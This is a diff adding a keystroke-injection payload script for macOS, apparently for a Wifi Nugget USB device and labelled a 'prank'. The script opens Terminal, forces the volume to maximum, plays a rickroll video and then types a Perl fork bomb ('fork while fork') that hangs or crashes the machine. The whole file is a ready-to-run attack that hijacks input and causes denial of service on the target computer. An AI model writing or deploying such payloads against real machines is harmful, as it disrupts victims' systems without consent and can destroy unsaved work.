@@ -1,0 +1,26 @@
+REM Title:	macOS rickroll + Crash
+REM Author: After Packet
+REM Description:Opens a rickroll  at maximum volume and crashes mac using perl fork 
+REM Target:	macOS 11.0+
+REM Version:	1.0
+REM Category:	Prank
+REM Source:        https://github.com/AfterPacket/Wifi-Nugget-Payloads
+DELAY 1000
+GUI SPACE
+STRING terminal
+ENTER
+DELAY 1000
+STRING osascript -e "set volume without output muted" && osascript -e 'set volume 100' && open 'https://ia601602.us.archive.org/11/items/Rick_Astley_Never_Gonna_Give_You_Up/Rick_Astley_Never_Gonna_Give_You_Up.mp4'
+ENTER
+FN F
+DELAY 30000
+GUI SPACE
+DELAY 300
+STRING terminal
+ENTER
+DELAY 1000
+STRING perl -e "fork while fork" 
+ENTER
+DELAY 1000
+COMMAND TAB
+DELAY 200
